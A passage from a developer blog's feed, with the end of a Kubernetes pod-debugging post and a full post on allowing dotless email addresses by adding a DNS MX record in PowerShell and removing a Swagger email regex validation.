style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> some</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">nodejs</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">service</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">image</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> alpine</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">command</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token string" style="color:#e3116c">"/bin/bash"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">args</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"-c"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"|"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"mkdir -p /tmp/other-res;"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"mv /path/to/app/tmp /tmp/other-res&amp;&amp;"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Added this</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  "mv /path/to/resources.dal.js /path/to/resources.dal.js.bak"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token comment" style="color:#999988;font-style:italic"># Added this</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  "cp /opt/storage/resources.dal.js /path/to/resources.dal.js"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token string" style="color:#e3116c">"npm start"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token key atrule" style="color:#00a4db">volumeMounts</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">mountPath</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> /opt/storage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> storage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">volumes</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"> </span><span class="token key atrule" style="color:#00a4db">name</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> storage</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">persistentVolumeClaim</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">claimName</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> storage</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">claim</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Upon saving the changes, I needed to terminate the Pods for changes to take effect using:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">kubectl scale deployment some-nodejs-service </span><span class="token parameter variable" style="color:#36acaa">--replicas</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">kubectl scale deployment some-nodejs-service </span><span class="token parameter variable" style="color:#36acaa">--replicas</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>This fixed the problem, another satisfied customer escalation was resolved!</p>]]></content>
        <author>
            <name>Kobbi Gal</name>
            <uri>https://github.com/kbbgl</uri>
        </author>
        <category label="Containers" term="Containers"/>
        <category label="Debugging" term="Debugging"/>
        <category label="Dev" term="Dev"/>
        <category label="Docker" term="Docker"/>
        <category label="Droppy" term="Droppy"/>
        <category label="K8s" term="K8s"/>
        <category label="Kubernetes" term="Kubernetes"/>
        <category label="Node" term="Node"/>
        <category label="Nodejs" term="Nodejs"/>
        <category label="Web" term="Web"/>
        <category label="Webapplication" term="Webapplication"/>
        <category label="Webdevelopment" term="Webdevelopment"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[How To Set Up Dotless Email Validation in Swagger]]></title>
        <id>https://kbbgl.github.io/blog/dotless-email-regex-validation-swagger</id>
        <link href="https://kbbgl.github.io/blog/dotless-email-regex-validation-swagger"/>
        <updated>2025-02-26T00:45:50.000Z</updated>
        <summary type="html"><![CDATA[A detailed explanation what dotless emails are and how to set them up in Swagger.]]></summary>
        <content type="html"><![CDATA[<h2 class="anchor anchorWithStickyNavbar_LWe7" id="introduction">Introduction<a href="https://kbbgl.github.io/blog/dotless-email-regex-validation-swagger#introduction" class="hash-link" aria-label="Direct link to Introduction" title="Direct link to Introduction">​</a></h2>
<p>One of our customers recently attempted (for reason unknown to us) to log into our platform using <a href="https://www.okta.com/products/single-sign-on/" target="_blank" rel="noopener noreferrer">Okta Single Sign On (SSO)</a> and <a href="https://openid.net/connect/" target="_blank" rel="noopener noreferrer">OpenID-Connect</a> with emails missing a top-level domain (TLD) while they could log in just fine with a standard email address.</p>
<p>While most of us in the day-to-day use the standard email address format with a top-level domain added, e.g. <code>user@domain.org</code>, this customer required to be able to log in with user@domain. Our platform rejected the user and they were unable to log in.</p>
<p>My first question was whether this email address (<code>user@domain</code>) was even allowed. If it was, I needed to find why it's being rejected.</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="email-address-syntax-compliance">Email Address Syntax Compliance<a href="https://kbbgl.github.io/blog/dotless-email-regex-validation-swagger#email-address-syntax-compliance" class="hash-link" aria-label="Direct link to Email Address Syntax Compliance" title="Direct link to Email Address Syntax Compliance">​</a></h2>
<p>Reaching out to the web to figure out whether the customer's request was valid, I was surprised to find that the only necessary parts of an email address are according to <a href="https://datatracker.ietf.org/doc/html/rfc2821#section-2.3.10" target="_blank" rel="noopener noreferrer">section 2.3.10 of the RFC 2821</a>:</p>
<ul>
<li>A 'local' part, anything on the left of the @ sign.</li>
<li>A 'domain host' part, anything on the right of the @ sign.</li>
</ul>
<p>I found that the <a href="https://www.icann.org/en/system/files/files/ua-factsheet-a4-17dec15-en.pdf" target="_blank" rel="noopener noreferrer">Internet Corporation for Assigned Names (ICANN) highly discourages the use of unspecified TLD</a> and that it <a href="https://www.icann.org/en/announcements/details/new-gtld-dotless-domain-names-prohibited-30-8-2013-en" target="_blank" rel="noopener noreferrer">requires a specified record in the apex of the TLD zone in the DNS</a>. Aside from that, it is compliant with <a href="https://datatracker.ietf.org/doc/html/rfc5322#section-3" target="_blank" rel="noopener noreferrer">RFC 5322</a>.</p>
<p>So the customer's request is a valid one! This meant that I needed to perform 2 changes in two different areas:</p>
<ul>
<li>
<p>Modify the name server configuration on the customer's Windows instance.</p>
</li>
<li>
<p>Find where within our code there's validation for the email address and modify it.</p>
</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="adding-tld-zone-record-to-dns">Adding TLD Zone Record to DNS<a href="https://kbbgl.github.io/blog/dotless-email-regex-validation-swagger#adding-tld-zone-record-to-dns" class="hash-link" aria-label="Direct link to Adding TLD Zone Record to DNS" title="Direct link to Adding TLD Zone Record to DNS">​</a></h2>
<p>After a few days of awaiting access to the DNS, I now needed to understand what record I needed to add to the DNS. The <a href="https://www.icann.org/en/announcements/details/new-gtld-dotless-domain-names-prohibited-30-8-2013-en" target="_blank" rel="noopener noreferrer">ICANN link above</a> suggested that:</p>
<blockquote>
<p>Dotless names would require the inclusion of, for example, an A, AAAA, or MX, record in the apex of a TLD zone in the DNS (i.e., the record relates to the TLD-string itself).</p>
</blockquote>
<p>I found out that the <a href="https://www.cloudflare.com/learning/dns/dns-records/dns-a-record/" target="_blank" rel="noopener noreferrer">A record indicates the IPv4 address</a> of a domain and that the the <a href="https://il.godaddy.com/en/help/add-an-aaaa-record-19214" target="_blank" rel="noopener noreferrer">AAAA record was the same but for IPv6</a>. The relevant record seemed to be <a href="https://www.cloudflare.com/learning/dns/dns-records/dns-mx-record/" target="_blank" rel="noopener noreferrer">MX as it directs emails to SMTP servers</a>.</p>
<p>Now that I knew that I needed to add an MX record, I found a <a href="https://docs.microsoft.com/en-us/powershell/module/dnsserver/add-dnsserverresourcerecordmx?view=windowsserver2019-ps" target="_blank" rel="noopener noreferrer">PowerShell cmdlet called <code>Add-DnsServerResourceRecordMX</code></a> which would allow me to do just that.</p>
<p>After reading through the documentation and doing some trial and error on my test machine, I formulated the following command to successfully add the MX record:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Add-DnsServerResourceRecordMX</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Preference 1 </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">Name “</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">” </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">MailExchange “GS-MEX001</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">domain</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">suffix” </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">ZoneName “domain</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">suffix”</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Here's an explanation of the cmdlet argments:</p>
<ul>
<li>
<p>I set <code>-Preference</code> to <code>1</code> ensure that all SMTP requests sent from this Windows instance to mailservers will go through this <code>MX</code> record.</p>
</li>
<li>
<p><code>-Name</code> specifies the name of the host for which this record will apply. In this case, we used <code>.</code> because we're going to be using the parent domain as the suffix instead of the TLD.</p>
</li>
<li>
<p><code>-MailExchange</code> specifes the Fully Qualified Domain Name (FQDN) for the mail exchanger, e.g. the SMTP server address. Obviously the one used in the command above is made up.</p>
</li>
<li>
<p><code>-ZoneName</code> specifies the DNS zone. DNS is split into different zones which allow administrators to have granular control of different DNS components such as certificates, authoritative nameservers and providers.</p>
</li>
</ul>
<p>After running this command on the production server, I saw that they were successfully added by running the following cmdlet:</p>
<div class="language-powershell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-powershell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">Get-DnsServerSetting</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain">All</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>So now, if someone sends an email to the address <code>@domain.suffix</code>, the sender email server will review and choose the <code>MX</code> record we created above and will direct the packet to it.</p>
<p>Our work with nameservers is done! Next step is to look at some platform code!</p>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="changing-swagger-validation">Changing Swagger Validation<a href="https://kbbgl.github.io/blog/dotless-email-regex-validation-swagger#changing-swagger-validation" class="hash-link" aria-label="Direct link to Changing Swagger Validation" title="Direct link to Changing Swagger Validation">​</a></h2>
<p>Reviewing our backend logic for the particular NodeJS microservice which handles all user authentication and management, I found out that when a user is able to successfully  log into the system using an SSO mechanism, the microservice generates an object for this user and saves in it in the database. As part of this user object generation, there is validation of the request body of the email property. This is why, when attempting to generate a user without a TLD on the platform, the API returns a <code>422 - Unprocessable Entity</code>:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-X</span><span class="token plain"> POST </span><span class="token string" style="color:#e3116c">"http://test/api/users"</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-H</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Accept: application/json"</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-H</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Content-Type: application/json"</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token string" style="color:#e3116c">"first_name"</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"John"</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token string" style="color:#e3116c">"last_name"</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Doe"</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token string" style="color:#e3116c">"email"</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"jdoe@domain"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<div class="language-json codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-json codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token property" style="color:#36acaa">"error"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">"message"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Request validation failed: Parameter (user) failed schema validation"</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">"status"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">422</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        </span><span class="token property" style="color:#36acaa">"httpMessage"</span><span class="token operator" style="color:#393A34">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Unprocessable Entity"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>After further debugging, I was able to pinpoint where this user creation validation is enforced: in the <a href="https://swagger.io/" target="_blank" rel="noopener noreferrer">Swagger</a> configuration:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token key atrule" style="color:#00a4db">user</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">type</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> object</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">  </span><span class="token key atrule" style="color:#00a4db">properties</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">    </span><span class="token key atrule" style="color:#00a4db">email</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">type</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> string</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">      </span><span class="token key atrule" style="color:#00a4db">pattern</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">&gt;</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">        ^((</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">^&lt;</span><span class="token punctuation" style="color:#393A34">&gt;</span><span class="token plain">()</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">\</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">\\.</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">\s@"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">+(\.</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">^&lt;</span><span class="token punctuation" style="color:#393A34">&gt;</span><span class="token plain">()</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">\</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">\\.</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain">;</span><span class="token punctuation" style="color:#393A34">:</span><span class="token plain">\s@"</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">+)</span><span class="token important">*)|(".+"))@((\</span><span class="token punctuation" style="color:#393A34">[</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">\.</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">\.</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">\.</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">,</span><span class="token number" style="color:#36acaa">3</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">\</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">)</span><span class="token punctuation" style="color:#393A34">|</span><span class="token plain">((</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">zA</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">Z\</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">0</span><span class="token punctuation" style="color:#393A34">-</span><span class="token number" style="color:#36acaa">9</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain">+\.)+</span><span class="token punctuation" style="color:#393A34">[</span><span class="token plain">a</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">zA</span><span class="token punctuation" style="color:#393A34">-</span><span class="token plain">Z</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">{</span><span class="token number" style="color:#36acaa">2</span><span class="token punctuation" style="color:#393A34">,</span><span class="token punctuation" style="color:#393A34">}</span><span class="token plain">))$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>Removing this pattern-based validation and restarting the microservice, I was able to successfully generate a user!</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">curl</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-X</span><span class="token plain"> POST </span><span class="token string" style="color:#e3116c">"http://test/api/users"</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-H</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Accept: application/json"</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-H</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Content-Type: application/json"</span><span class="token plain"> </span><span class="token parameter variable" style="color:#36acaa">-d</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token string" style="color:#e3116c">"firstName"</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"John"</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token string" style="color:#e3116c">"lastName"</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"Doe"</span><span class="token plain">,</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">   </span><span class="token string" style="color:#e3116c">"email"</span><span class="token builtin class-name">:</span><span class="token plain"> </span><span class="token string" style="color:#e3116c">"jdoe@domain"</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" 